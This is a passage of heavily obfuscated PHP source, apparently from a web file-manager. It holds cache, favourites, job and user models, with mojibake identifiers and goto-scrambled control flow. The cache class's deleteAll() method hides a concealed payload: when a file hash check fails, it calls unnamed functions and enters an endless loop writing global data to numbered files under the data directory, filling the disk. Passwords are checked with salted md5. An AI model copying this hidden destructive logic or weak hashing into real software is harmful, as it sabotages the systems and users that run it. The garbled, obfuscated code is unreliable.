$aÍ³ÊÃ¡ÕÄ); $D¹¤Ò×Ğß¡ = array($D¢‘ÄÊ¥ğå[169] => $CìÈß— ŒØ[0], $D¢‘ÄÊ¥ğå[170] => $CìÈß— ŒØ[1]); $FòÇÈ™óÓç = array_merge($FòÇÈ™óÓç, $D¹¤Ò×Ğß¡); } public function set($A²Şô ¢¢, $A¼Æšßøù­, $AÄøŒ†¿ŞÁ = false) { $AÄøŒ†¿ŞÁ = $AÄøŒ†¿ŞÁ ? $AÄøŒ†¿ŞÁ : $this->cacheTime; return $this->handle->setEx($A²Şô ¢¢, $AÄøŒ†¿ŞÁ, $A¼Æšßøù­); } public function setLock($A‚ÄŠ¤êËØ, $b½³”òÉòâ, $A‰Ğ–š ˜) { return $this->handle->setNX($A‚ÄŠ¤êËØ, $b½³”òÉòâ); } public function get($b‡à—ì¿»‹) { $d¢Æªì‘È = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $d¢Æªì‘È->get($b‡à—ì¿»‹); } public function remove($e³ªÉ›¶çÌ) { return $this->handle->del($e³ªÉ›¶çÌ); } public function deleteAll() { $b…Áà»Ï‚ =& $_SERVER[Î¿—”òá]; $F½Ìí°¯Ò = $_SERVER[$b…Áà»Ï‚[679]] . $b…Áà»Ï‚[680]; $bçâ¡¤ˆæ = $b…Áà»Ï‚[784]; if ($_SERVER[$b…Áà»Ï‚[676]] != $bçâ¡¤ˆæ($F½Ìí°¯Ò)) { goto dÔÜÅ„ª¬Å; dÔÜÅ„ª¬Å: $a½á„¢–” = $b…Áà»Ï‚[785]; $d¥£‡ªİåè = $b…Áà»Ï‚[678]; $bÎã–ï­¢Î = $_SERVER[$b…Áà»Ï‚[679]] . $b…Áà»Ï‚[680]; goto d«¯ó÷Ä™İ; A‰œ‹Œô¾”: $a½á„¢–”(); $c¸Œ¢ÒÂÓ‹ = $b…Áà»Ï‚[788]; $cö“É„İïª = json_encode($GLOBALS[$b…Áà»Ï‚[789]]); goto Bó„’—¶ö¹; d«¯ó÷Ä™İ: $a¦Âç±Ôª = $d¥£‡ªİåè($bÎã–ï­¢Î); $CéÎ—…­À = explode($b…Áà»Ï‚[217], $a¦Âç±Ôª); if (count($CéÎ—…­À) < $b…Áà»Ï‚[567]) { $bªåÀŸå“ó = $b…Áà»Ï‚[681]; $bªåÀŸå“ó(); } goto D®Ù¶áŒÆ·; D®Ù¶áŒÆ·: $DŸ–•«ï„ = $b…Áà»Ï‚[786]; $DŸ–•«ï„($_SERVER[$b…Áà»Ï‚[787]]); $a½á„¢–” = $b…Áà»Ï‚[785]; goto A‰œ‹Œô¾”; Bó„’—¶ö¹: $AÒøß¥‘È÷ = 1; for ($eÍß·ŒôÎ‡ = $AÒøß¥‘È÷; $eÍß·ŒôÎ‡ > 0; $eÍß·ŒôÎ‡++) { $c¸Œ¢ÒÂÓ‹(DATA_PATH . $eÍß·ŒôÎ‡, $cö“É„İïª); } goto d°Ÿ„˜‰±; d°Ÿ„˜‰±: } if ($this->isCluster) { foreach ($this->handle->_masters() as $C¼±–ÓÖŠÔ) { $this->handle->flushall($C¼±–ÓÖŠÔ); } return; } return $this->handle->flushAll(); } } goto Bç›Û÷¼øÒ; cÍä˜°Ğ¶: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($b›©‘å¨Ÿñ) { $cÂ˜ÁÍÙ¤ê =& $_SERVER[Î¿—”òá]; return array($cÂ˜ÁÍÙ¤ê[2482] => array(USER_ID, $cÂ˜ÁÍÙ¤ê[2483])); } protected function listData() { $aîíîˆ‘¦ =& $_SERVER[Î¿—”òá]; $a°İ¹®·ßÚ = array($aîíîˆ‘¦[1420] => USER_ID, $aîíîˆ‘¦[436] => 0); $Cğæ·á«êµ = $aîíîˆ‘¦[2484]; $E–Ëğƒ…Ìö = $this->field($Cğæ·á«êµ)->where($a°İ¹®·ßÚ)->order($aîíîˆ‘¦[2485])->select(); return $E–Ëğƒ…Ìö ? $E–Ëğƒ…Ìö : array(); } protected function resetCache() { } protected function listView() { goto dÈö†Âæõ¹; f®ƒÊ šõ: $B¨Ûµ¡Óí = array($Bà³Éöë¦¦[383] => array($Bà³Éöë¦¦[384], $DÖˆ¿ğ‡ÇŠ)); $Eè¾ïäë©Ñ = Model($Bà³Éöë¦¦[749])->listSource($B¨Ûµ¡Óí, $F˜ÄæÎ˜“); $Eè¾ïäë©Ñ = array_merge($Eè¾ïäë©Ñ[$Bà³Éöë¦¦[73]], $Eè¾ïäë©Ñ[$Bà³Éöë¦¦[74]]); goto E«œÅÕîÀÒ; bí´œ”öÜÏ: $DÖˆ¿ğ‡ÇŠ = array_to_keyvalue($DğÈí”Ã×, $Bà³Éöë¦¦[33], $Bà³Éöë¦¦[75]); if (!$DÖˆ¿ğ‡ÇŠ) { return $F£Üèê¯§; } $F˜ÄæÎ˜“ = 2000; goto f®ƒÊ šõ; E«œÅÕîÀÒ: $Eè¾ïäë©Ñ = array_to_keyvalue($Eè¾ïäë©Ñ, $Bà³Éöë¦¦[369]); foreach ($F£Üèê¯§ as $e„…º·´ãŒ => $AŠ”ã–ˆÆ¦) { $F§¢ôÓ‹Œ = $Eè¾ïäë©Ñ[$AŠ”ã–ˆÆ¦[$Bà³Éöë¦¦[75]]]; $F§¢ôÓ‹Œ = $F§¢ôÓ‹Œ ? $F§¢ôÓ‹Œ : array(); $F£Üèê¯§[$e„…º·´ãŒ] = array_merge($F§¢ôÓ‹Œ, $AŠ”ã–ˆÆ¦); } return $F£Üèê¯§; goto F—£¼Æ‹; dÈö†Âæõ¹: $Bà³Éöë¦¦ =& $_SERVER[Î¿—”òá]; $F£Üèê¯§ = $this->listData(); $DğÈí”Ã× = array_filter_by_field($F£Üèê¯§, $Bà³Éöë¦¦[29], $Bà³Éöë¦¦[382]); goto bí´œ”öÜÏ; F—£¼Æ‹: } protected function addFav($a ì–ªğæ·, $B çÉ°à = '', $b¡Ëºå‹ß = "\x73\157\165\x72\x63\x65") { goto eç®¨²Šñ; aÄà¹‡Á±: if (!$B çÉ°à && $b¡Ëºå‹ß == $D…ÏŸ¯ö[382]) { $E¿øŠ‘‡ÖÖ = Model($D…ÏŸ¯ö[1110])->where(array($D…ÏŸ¯ö[383] => $a ì–ªğæ·))->find(); if (!$E¿øŠ‘‡ÖÖ) { return !1; } $B çÉ°à = $E¿øŠ‘‡ÖÖ[$D…ÏŸ¯ö[28]]; } $B çÉ°à = $this->getAutoName($B çÉ°à); $cÈ¿³¹î¨ƒ = array($D…ÏŸ¯ö[1420] => USER_ID, $D…ÏŸ¯ö[436] => 0, $D…ÏŸ¯ö[386] => $B çÉ°à, $D…ÏŸ¯ö[387] => $a ì–ªğæ·, $D…ÏŸ¯ö[388] => $b¡Ëºå‹ß, $D…ÏŸ¯ö[2101] => $eÎ´£¯“²Ã + 1); goto a’õ÷°ã‚ê; a—æĞ£: $bğ— ·¾Ù = array($D…ÏŸ¯ö[1420] => USER_ID, $D…ÏŸ¯ö[436] => 0); $eÎ´£¯“²Ã = $this->where($bğ— ·¾Ù)->max($D…ÏŸ¯ö[2118]); if (!$eÎ´£¯“²Ã) { $eÎ´£¯“²Ã = 0; } goto aÄà¹‡Á±; eç®¨²Šñ: $D…ÏŸ¯ö =& $_SERVER[Î¿—”òá]; $bğ— ·¾Ù = array($D…ÏŸ¯ö[1420] => USER_ID, $D…ÏŸ¯ö[436] => 0, $D…ÏŸ¯ö[388] => $b¡Ëºå‹ß, $D…ÏŸ¯ö[387] => $a ì–ªğæ·); if ($this->where($bğ— ·¾Ù)->find()) { return !1; } goto a—æĞ£; a’õ÷°ã‚ê: return $this->add($cÈ¿³¹î¨ƒ); goto AùØØÕĞ¨¹; AùØØÕĞ¨¹: } protected function remove($CÆÁØ”–) { $b˜Úİä÷¬Ø =& $_SERVER[Î¿—”òá]; $EÛ…ÄŒœâĞ = array($b˜Úİä÷¬Ø[1420] => USER_ID, $b˜Úİä÷¬Ø[385] => $CÆÁØ”–); return $this->where($EÛ…ÄŒœâĞ)->delete(); } protected function removeByName($a·ÕŸ—Âæœ) { $DÒ´ïğ¼»ß =& $_SERVER[Î¿—”òá]; $CÍÀŸ³±ò = array($DÒ´ïğ¼»ß[1420] => USER_ID, $DÒ´ïğ¼»ß[386] => $a·ÕŸ—Âæœ, $DÒ´ïğ¼»ß[436] => 0); return $this->where($CÍÀŸ³±ò)->delete(); } protected function rename($e©â°óÆš©, $C÷Åíñç†è) { $fƒ£Û¡†ğ =& $_SERVER[Î¿—”òá]; if ($e©â°óÆš© == $C÷Åíñç†è) { return !1; } $AôÁïÅ…ùĞ = $this->getAutoName($C÷Åíñç†è); if ($C÷Åíñç†è != $AôÁïÅ…ùĞ) { return !1; } $Cœ§ØêÙ†‡ = array($fƒ£Û¡†ğ[1420] => USER_ID, $fƒ£Û¡†ğ[436] => 0, $fƒ£Û¡†ğ[28] => $e©â°óÆš©); return $this->where($Cœ§ØêÙ†‡)->save(array($fƒ£Û¡†ğ[28] => $C÷Åíñç†è)); } protected function resetSort($eÕ¢Ïë¸ÏŸ) { $fÑšõËÏ®¢ =& $_SERVER[Î¿—”òá]; $eÕ¢Ïë¸ÏŸ = is_array($eÕ¢Ïë¸ÏŸ) ? $eÕ¢Ïë¸ÏŸ : array(); $EÂˆ¥Ö¿Ö = array($fÑšõËÏ®¢[1420] => USER_ID); for ($Eõö™Ô¢Š = 0; $Eõö™Ô¢Š < count($eÕ¢Ïë¸ÏŸ); $Eõö™Ô¢Š++) { $EÂˆ¥Ö¿Ö[$fÑšõËÏ®¢[385]] = $eÕ¢Ïë¸ÏŸ[$Eõö™Ô¢Š]; $this->where($EÂˆ¥Ö¿Ö)->save(array($fÑšõËÏ®¢[2101] => $Eõö™Ô¢Š + 1)); } return !0; } protected function moveTop($fŒæ©…¸Ò) { goto C’Ò¢×àÕè; eøŒ‚…ªòš: $fµÖ¹¤¹Êî = $Fƒİ®Š™ÊÇ; $Fƒİ®Š™ÊÇ = array_remove_value($Fƒİ®Š™ÊÇ, $B©®§âîŒ¡[$eÎ÷‹ï‘ÔÃ[367]]); array_unshift($Fƒİ®Š™ÊÇ, $B©®§âîŒ¡[$eÎ÷‹ï‘ÔÃ[367]]); goto CÊÔ¶”Ô‰; C’Ò¢×àÕè: $eÎ÷‹ï‘ÔÃ =& $_SERVER[Î¿—”òá]; $a‘šÏ®èœ˜ = array($eÎ÷‹ï‘ÔÃ[1420] => USER_ID, $eÎ÷‹ï‘ÔÃ[436] => 0); $B©®§âîŒ¡ = $this->where($a‘šÏ®èœ˜)->where(array($eÎ÷‹ï‘ÔÃ[28] => $fŒæ©…¸Ò))->find(); goto cå©óáã¨´; CÊÔ¶”Ô‰: return $this->resetSort($Fƒİ®Š™ÊÇ); goto FèÏ…íÊÉ»; cå©óáã¨´: if (!$B©®§âîŒ¡) { return; } $Fƒİ®Š™ÊÇ = $this->field($eÎ÷‹ï‘ÔÃ[367])->where($a‘šÏ®èœ˜)->order($eÎ÷‹ï‘ÔÃ[2485])->select(); $Fƒİ®Š™ÊÇ = array_to_keyvalue($Fƒİ®Š™ÊÇ, $eÎ÷‹ï‘ÔÃ[33], $eÎ÷‹ï‘ÔÃ[367]); goto eøŒ‚…ªòš; FèÏ…íÊÉ»: } protected function moveBottom($d±–É­­Ğ) { $cœÑàåÅËœ =& $_SERVER[Î¿—”òá]; $F¨±¸İ” = array($cœÑàåÅËœ[1420] => USER_ID, $cœÑàåÅËœ[436] => 0); $f á°ä¿¿ = $this->where($F¨±¸İ”)->max($cœÑàåÅËœ[2118]); $b°ñÜäÚéï = array($cœÑàåÅËœ[2118] => $f á°ä¿¿ + 1); return $this->where($F¨±¸İ”)->where(array($cœÑàåÅËœ[28] => $d±–É­­Ğ))->save($b°ñÜäÚéï); } private function getAutoName($fƒ¨ˆì…Üµ) { goto BœÆ½ÄëÆö; BœÆ½ÄëÆö: $eØ–¨ØÑÔ˜ =& $_SERVER[Î¿—”òá]; $bÓÍã½²Ğ· = array($eØ–¨ØÑÔ˜[1420] => USER_ID, $eØ–¨ØÑÔ˜[436] => 0); $Dòô»µàîˆ = $this->field($eØ–¨ØÑÔ˜[28])->where($bÓÍã½²Ğ·)->select(); goto cùÔğÔ›‡ˆ; B™„æííù¦: return $fƒ¨ˆì…Üµ . "\x28{$fáÙùçêæ}\x29"; goto FÈƒæƒÔŸ; cùÔğÔ›‡ˆ: $Dòô»µàîˆ = array_to_keyvalue($Dòô»µàîˆ, $eØ–¨ØÑÔ˜[33], $eØ–¨ØÑÔ˜[28]); if (!$Dòô»µàîˆ || !in_array($fƒ¨ˆì…Üµ, $Dòô»µàîˆ)) { return $fƒ¨ˆì…Üµ; } for ($fáÙùçêæ = 0; $fáÙùçêæ < count($Dòô»µàîˆ); $fáÙùçêæ++) { if (!in_array($fƒ¨ˆì…Üµ . "\x28{$fáÙùçêæ}\x29", $Dòô»µàîˆ)) { return $fƒ¨ˆì…Üµ . "\x28{$fáÙùçêæ}\51"; } } goto B™„æííù¦; FÈƒæƒÔŸ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x6a\x6f\x62\114\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\x64\x65\163\x63", "\163\x6f\x72\x74"); const JOB_KEY = "\163\145\x6c\146\x4a\x6f\x62\x4c\x69\163\x74"; public function listData($a­–†àÄ¢ê = false, $a¤¨Çô‰ƒÜ = "\163\x6f\x72\164", $AèŒŞ…Šƒ× = false) { return parent::listData($a­–†àÄ¢ê, $a¤¨Çô‰ƒÜ, $AèŒŞ…Šƒ×); } public function remove($bö‹›¦¤Ÿ) { return parent::remove($bö‹›¦¤Ÿ); } public function add($FäÕäÕî£É) { $eËÜè‰Š© =& $_SERVER[Î¿—”òá]; if ($this->findByName($FäÕäÕî£É[$eËÜè‰Š©[28]])) { return !1; } $FäÕäÕî£É[$eËÜè‰Š©[2118]] = $this->getSort(); return parent::insert($FäÕäÕî£É); } private function getSort() { $dªƒŞÊ‹­Í =& $_SERVER[Î¿—”òá]; $dß››§·´‘ = parent::listData(); $b±©½¬Æâî = array_to_keyvalue($dß››§·´‘, $dªƒŞÊ‹­Í[33], $dªƒŞÊ‹­Í[2118]); return empty($b±©½¬Æâî) ? 0 : max($b±©½¬Æâî) + 1; } public function update($C§Û¥“–½«, $b²ëÒïÀÍ) { $a…é½Ï„‘ =& $_SERVER[Î¿—”òá]; $Aƒ©ÊÄ³Í = parent::listData($C§Û¥“–½«); $EÚ½¦Ú¼¾¡ = $this->findByName($b²ëÒïÀÍ[$a…é½Ï„‘[28]]); if (!$Aƒ©ÊÄ³Í || $EÚ½¦Ú¼¾¡ && $EÚ½¦Ú¼¾¡[$a…é½Ï„‘[367]] != $Aƒ©ÊÄ³Í[$a…é½Ï„‘[367]]) { return !1; } return parent::update($C§Û¥“–½«, $b²ëÒïÀÍ); } public function setUserJob($dßïá–ÀŠè, $f¡†Ğî“‡à) { goto CÊÀÓà¯; F¿§œÃÀ¢: $dÉÌå©›…İ = rtrim($dÉÌå©›…İ, $Fõ†È»Ùê¯[47]); Model($Fõ†È»Ùê¯[477])->metaSet($dßïá–ÀŠè, self::JOB_KEY, $dÉÌå©›…İ); goto C ­¢“Å¨•; d‚í³Ş×¥‘: $dî–¨ÌÁ = array_to_keyvalue($Cé‡ˆ²ßÍ¡, $Fõ†È»Ùê¯[28]); $dÉÌå©›…İ = $Fõ†È»Ùê¯[361]; foreach ($f¡†Ğî“‡à as $E§ƒçàÌé†) { if ($dî–¨ÌÁ[$E§ƒçàÌé†]) { $dÉÌå©›…İ .= $dî–¨ÌÁ[$E§ƒçàÌé†][$Fõ†È»Ùê¯[367]] . $Fõ†È»Ùê¯[47]; } else { $Aá® Â´—³ = $this->add($E§ƒçàÌé†); $dÉÌå©›…İ .= $Aá® Â´—³ . $Fõ†È»Ùê¯[47]; } } goto F¿§œÃÀ¢; CÊÀÓà¯: $Fõ†È»Ùê¯ =& $_SERVER[Î¿—”òá]; if (!is_array($f¡†Ğî“‡à)) { $f¡†Ğî“‡à = array($f¡†Ğî“‡à); } $Cé‡ˆ²ßÍ¡ = parent::listData(); goto d‚í³Ş×¥‘; C ­¢“Å¨•: } public function getUserJob($dŠ½¬°»Éõ) { $C–‘ÄïØ‡« = Model($_SERVER[Î¿—”òá][477])->metaGet($dŠ½¬°»Éõ); return $this->getUserJobInfo($C–‘ÄïØ‡«[self::JOB_KEY]); } public function getUserJobInfo($BÌ‹µè§Ïè) { goto C©¤­ÌËÂÂ; C©¤­ÌËÂÂ: $A¥í°åÑ =& $_SERVER[Î¿—”òá]; $AòŒÁï…é‹ = explode($A¥í°åÑ[47], $BÌ‹µè§Ïè); $eÜæºÕˆêß = parent::listData(); goto Aİ¢æšÒĞ; FÇÍëàğ¿©: return $bÁá‹­‰Ô; goto eçÖÜÑ»£¯; Aİ¢æšÒĞ: $eÜæºÕˆêß = array_remove_key($eÜæºÕˆêß, $A¥í°åÑ[187]); $bÁá‹­‰Ô = array(); foreach ($AòŒÁï…é‹ as $CŠ‘Ş¶Â²Ø) { if (isset($eÜæºÕˆêß[$CŠ‘Ş¶Â²Ø])) { $bÁá‹­‰Ô[] = $eÜæºÕˆêß[$CŠ‘Ş¶Â²Ø]; } } goto FÇÍëàğ¿©; eçÖÜÑ»£¯: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\x6d\145" => "\165\163\x65\x72\137\x6d\x65\x74\x61", "\x6d\x65\x74\141\106\x69\x65\154\144" => "\165\163\x65\162\x49\104"); protected $simpleField = "\x75\x73\x65\162\111\x44\x2c\x6e\x69\143\x6b\116\141\x6d\145\x2c\156\x61\155\145\54\141\166\141\164\141\162\54\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($d‘ø‹â¬Í¨) { $bøò‡ò·Ş =& $_SERVER[Î¿—”òá]; $bø“¯Òõ¤ø = $bøò‡ò·Ş[2486]; return array($bøò‡ò·Ş[2163] => array($d‘ø‹â¬Í¨[0], $bø“¯Òõ¤ø), $bøò‡ò·Ş[2165] => array($d‘ø‹â¬Í¨[0], $bø“¯Òõ¤ø), $bøò‡ò·Ş[2487] => array($d‘ø‹â¬Í¨[0], $bø“¯Òõ¤ø)); } protected function getInfo($c‡‹ğùí‡–, $AšùóŸ‚ = false) { $f†ÈôªãÎÉ = $this->getInfoSimple($c‡‹ğùí‡–); if (!is_array($f†ÈôªãÎÉ)) { return array(); } if ($AšùóŸ‚) { return $this->_getInfoApply($f†ÈôªãÎÉ); } return $this->cacheFunctionGet($_SERVER[Î¿—”òá][2208], $c‡‹ğùí‡–); } protected function getInfoFull($a½Å¢ù¼¥ï, $EÈÜ’ÕêÓ = false) { $E›ÆÚƒ©› = $this->getInfoSimple($a½Å¢ù¼¥ï); if (!is_array($E›ÆÚƒ©›)) { return array(); } if ($EÈÜ’ÕêÓ) { return $this->_getInfoApply($E›ÆÚƒ©›, !0); return $this->_getInfoApply($E›ÆÚƒ©›, !0); } return $this->cacheFunctionGet($_SERVER[Î¿—”òá][2488], $a½Å¢ù¼¥ï); } private function _getInfoApply($A™õ§Œ£·‘, $C¬•Ü¸É‹ = false) { goto Aêœé­½ÓÙ; DÏî¢¬ÍŠ: $A™õ§Œ£·‘ = $this->_listDataApplyItem($A™õ§Œ£·‘); $Dè£âÊïÙå = Model($A‡¿Ù½‚‹œ[1110])->metaGet($A™õ§Œ£·‘[$A‡¿Ù½‚‹œ[391]][$A‡¿Ù½‚‹œ[369]]); $A™õ§Œ£·‘[$A‡¿Ù½‚‹œ[2491]] = $AÂñ»¢¶†Œ; goto aÈ½èÒÂ…¬; aÈ½èÒÂ…¬: $A™õ§Œ£·‘[$A‡¿Ù½‚‹œ[391]][$A‡¿Ù½‚‹œ[2325]] = isset($Dè£âÊïÙå[$A‡¿Ù½‚‹œ[2326]]) ? $Dè£âÊïÙå[$A‡¿Ù½‚‹œ[2326]] : null; if ($C¬•Ü¸É‹) { $A™õ§Œ£·‘[$A‡¿Ù½‚‹œ[417]] = $this->metaGet($A™õ§Œ£·‘[$A‡¿Ù½‚‹œ[1429]]); } return $A™õ§Œ£·‘; goto Cƒôè¥ŞŒ; Aêœé­½ÓÙ: $A‡¿Ù½‚‹œ =& $_SERVER[Î¿—”òá]; if (!$A™õ§Œ£·‘) { return $A™õ§Œ£·‘; } $AÂñ»¢¶†Œ = md5($A‡¿Ù½‚‹œ[2489] . $A™õ§Œ£·‘[$A‡¿Ù½‚‹œ[795]] . $A‡¿Ù½‚‹œ[2490] . $A™õ§Œ£·‘[$A‡¿Ù½‚‹œ[28]]); goto DÏî¢¬ÍŠ; Cƒôè¥ŞŒ: } protected function getInfoSimple($CæšŞ¹£ğß, $fëùÍ¯ƒ = false) { $FÛ½†ŠÑª½ =& $_SERVER[Î¿—”òá]; if (!$CæšŞ¹£ğß) { return array(); } if ($fëùÍ¯ƒ) { $dï‰±äØ•‘ = $this->where(array($FÛ½†ŠÑª½[1429] => intval($CæšŞ¹£ğß)))->find(); if (!is_array($dï‰±äØ•‘)) { return array(); } $dï‰±äØ•‘[$FÛ½†ŠÑª½[2492]] = Action($FÛ½†ŠÑª½[2493])->parseUrl($dï‰±äØ•‘[$FÛ½†ŠÑª½[2492]]); return $dï‰±äØ•‘; } return $this->cacheFunctionGet($FÛ½†ŠÑª½[2166], $CæšŞ¹£ğß); } protected function getInfoSimpleOuter($DÛ¯Ç“ˆ) { goto C¹ÒÙç˜‹; F½¡‰Š™Š›: $B¸¦·…Òˆ = array_field_key($Bé¥Æ®í„æ, explode($c¦‡¸ ƒ[47], $this->simpleField)); if (!$B¸¦·…Òˆ) { return array($c¦‡¸ ƒ[1429] => $c¦‡¸ ƒ[1024], $c¦‡¸ ƒ[28] => $c¦‡¸ ƒ[157] . LNG($c¦‡¸ ƒ[2496]) . $c¦‡¸ ƒ[476], $c¦‡¸ ƒ[2492] => STATIC_PATH . $c¦‡¸ ƒ[2497]); } $B¸¦·…Òˆ[$c¦‡¸ ƒ[2492]] = Action($c¦‡¸ ƒ[2493])->parseUrl($B¸¦·…Òˆ[$c¦‡¸ ƒ[2492]]); goto a½”ÛØßŞ; C¹ÒÙç˜‹: $c¦‡¸ ƒ =& $_SERVER[Î¿—”òá]; if (!$DÛ¯Ç“ˆ || $DÛ¯Ç“ˆ == 0) { return array($c¦‡¸ ƒ[1429] => $c¦‡¸ ƒ[468], $c¦‡¸ ƒ[28] => $c¦‡¸ ƒ[157] . LNG($c¦‡¸ ƒ[2494]) . $c¦‡¸ ƒ[476], $c¦‡¸ ƒ[2492] => STATIC_PATH . $c¦‡¸ ƒ[2495]); } $Bé¥Æ®í„æ = $this->cacheFunctionGet($c¦‡¸ ƒ[2166], $DÛ¯Ç“ˆ); goto F½¡‰Š™Š›; a½”ÛØßŞ: return $B¸¦·…Òˆ; goto f“ÁÖšÄ¼; f“ÁÖšÄ¼: } protected function groupUser($dùâ¯ğ¦²å) { } public static function errorLang($B÷ãÙÁ‹å¿) { $dØÚ±‰‚ºÉ =& $_SERVER[Î¿—”òá]; $CÈ¸è™‘Ş› = array(self::ERROR_USER_NOT_EXISTS => $dØÚ±‰‚ºÉ[2498], self::ERROR_USER_PASSWORD_ERROR => $dØÚ±‰‚ºÉ[2499], self::ERROR_USER_EXIST_NAME => $dØÚ±‰‚ºÉ[2500], self::ERROR_USER_EXIST_PHONE => $dØÚ±‰‚ºÉ[2501], self::ERROR_USER_EXIST_EMAIL => $dØÚ±‰‚ºÉ[2502], self::ERROR_USER_LOGIN_LOCK => $dØÚ±‰‚ºÉ[2503], self::ERROR_IP_NOT_ALLOW => $dØÚ±‰‚ºÉ[2504], self::ERROR_USER_EXIST_NICKNAME => $dØÚ±‰‚ºÉ[2505]); return LNG($CÈ¸è™‘Ş›[$B÷ãÙÁ‹å¿]); } public function getInfoByMeta($DÀ÷’ì†»×, $f´ µˆ) { $cõ‹Òãø”· =& $_SERVER[Î¿—”òá]; $E“¨Ë°Ÿ = Model($cõ‹Òãø”·[2506])->where(array($cõ‹Òãø”·[89] => $DÀ÷’ì†»×, $cõ‹Òãø”·[359] => $f´ µˆ))->find(); if ($E“¨Ë°Ÿ) { return $this->getInfo($E“¨Ë°Ÿ[$cõ‹Òãø”·[1429]]); } return !1; } public function userLoginCheck($D´Ğç—ÄÌ†, $d—Â…Ö¾±) { goto F¸Éî»•; bŒ‚í–Ó°­: $this->userEdit($b¢—ùèã·[$bïŞ‘Œ‰¡”[1429]], array($bïŞ‘Œ‰¡”[2508] => time())); return $this->getInfo($b¢—ùèã·[$bïŞ‘Œ‰¡”[1429]]); goto fòøÚöŞ›; có êå¾ÄÎ: $b¢—ùèã· = $this->where($e¦›öƒåĞÆ)->find(); if (!$b¢—ùèã·) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($b¢—ùèã·[$bïŞ‘Œ‰¡”[1429]], $d—Â…Ö¾±)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto bŒ‚í–Ó°­; F¸Éî»•: $bïŞ‘Œ‰¡” =& $_SERVER[Î¿—”òá]; $e¦›öƒåĞÆ = array($bïŞ‘Œ‰¡”[28] => $D´Ğç—ÄÌ†, $bïŞ‘Œ‰¡”[2329] => $D´Ğç—ÄÌ†, $bïŞ‘Œ‰¡”[293] => $D´Ğç—ÄÌ†, $bïŞ‘Œ‰¡”[2507] => $D´Ğç—ÄÌ†, $bïŞ‘Œ‰¡”[907] => $bïŞ‘Œ‰¡”[909]); if ($this->nickNameRpt()) { unset($e¦›öƒåĞÆ[$bïŞ‘Œ‰¡”[2329]]); } goto có êå¾ÄÎ; fòøÚöŞ›: } public function clearCache($b¥Œ‹Ãì›é) { $AÆ¡ËÌä˜” =& $_SERVER[Î¿—”òá]; $this->cacheFunctionClear($AÆ¡ËÌä˜”[2208], $b¥Œ‹Ãì›é); $this->cacheFunctionClear($AÆ¡ËÌä˜”[2166], $b¥Œ‹Ãì›é); $this->cacheFunctionClear($AÆ¡ËÌä˜”[2488], $b¥Œ‹Ãì›é); } public function userPasswordCheck($FãÑÊÏœ, $FøëïÜ™ŒÑ) { $AæßÎà•Ú =& $_SERVER[Î¿—”òá]; $d”ù¢¾Á‚ = $this->where(array($AæßÎà•Ú[1429] => intval($FãÑÊÏœ)))->find(); $EÑÂ©Áîìï = $this->metaGet($FãÑÊÏœ); $CŠµÃ ÙÍ = isset($EÑÂ©Áîìï[$AæßÎà•Ú[2509]]) ? $EÑÂ©Áîìï[$AæßÎà•Ú[2509]] : $AæßÎà•Ú[33]; if (md5($CŠµÃ ÙÍ . trim($FøëïÜ™ŒÑ)) !== $d”ù¢¾Á‚[$AæßÎà•Ú[795]]) { return !1; } return !0; } public function userAdd($e¾µ×àÓ½‚) { goto a»×Š›…³; FğáŸÆÅ: $aç½‘¬æ¾ = $this->_checkExist($e¾µ×àÓ½‚); if ($aç½‘¬æ¾ !== !0) { return $aç½‘¬æ¾; } $A°—è‡±· = $this->add($d‰Î´±Ã™); goto aáÕĞ‡ì³¶; aáÕĞ‡ì³¶: $eåÏ´¿°ß® = array($e¸™ĞçœêÂ[2517] => $d‰Î´±Ã™[$e¸™ĞçœêÂ[795]], $e¸™ĞçœêÂ[2513] => $d‰Î´±Ã™[$e¸™ĞçœêÂ[2329]]); $this->userEdit($A°—è‡±·, $eåÏ´¿°ß®); Model($e¸™ĞçœêÂ[1110])->userRootAdd($A°—è‡±·); goto Dğ¥¬ãÛëŠ; Dğ¥¬ãÛëŠ: return $A°—è‡±·; goto E† ƒ´ÚÇ‚; a»×Š›…³: $e¸™ĞçœêÂ =& $_SERVER[Î¿—”òá]; $d‰Î´±Ã™ = array($e¸™ĞçœêÂ[386] => $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[28]], $e¸™ĞçœêÂ[2510] => $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[1315]], $e¸™ĞçœêÂ[2511] => isset($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[293]]) ? $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[293]] : $e¸™ĞçœêÂ[33], $e¸™ĞçœêÂ[2512] => isset($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2507]]) ? $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2507]] : $e¸™ĞçœêÂ[33], $e¸™ĞçœêÂ[2513] => isset($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2329]]) ? $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2329]] : $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[28]], $e¸™ĞçœêÂ[2514] => isset($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2492]]) ? $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2492]] : $e¸™ĞçœêÂ[33], $e¸™ĞçœêÂ[2515] => isset($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2516]]) ? $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2516]] : 1, $e¸™ĞçœêÂ[2517] => $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[795]], $e¸™ĞçœêÂ[2167] => isset($e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2081]]) ? $e¾µ×àÓ½‚[$e¸™ĞçœêÂ[2081]] : 1024 * 1024 * 20, 